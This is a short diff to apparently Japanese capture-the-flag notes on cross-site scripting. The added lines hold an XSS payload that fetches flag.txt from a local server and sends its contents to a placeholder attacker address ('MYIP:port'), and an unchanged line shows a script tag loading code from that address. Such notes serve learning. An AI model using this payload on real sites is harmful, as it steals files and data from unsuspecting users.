@@ -61,3 +61,7 @@ Cookie の値 (ページ内でユーザー名を表示する際など)
 pythonで簡易的なサーバーを建てて通信をする　→　　<script src="http:/MYIP:ポート番号"></script>
 ```
 
+```
+XSSが成立したらファイルを抜き取る　　<script>fetch('http://127.0.0.1:8080/flag.txt').then(r => r.text()).then(t => fetch(`http:/MYIP:ポート番号/${encodeURIComponent(t)}`));</script>
+
+```
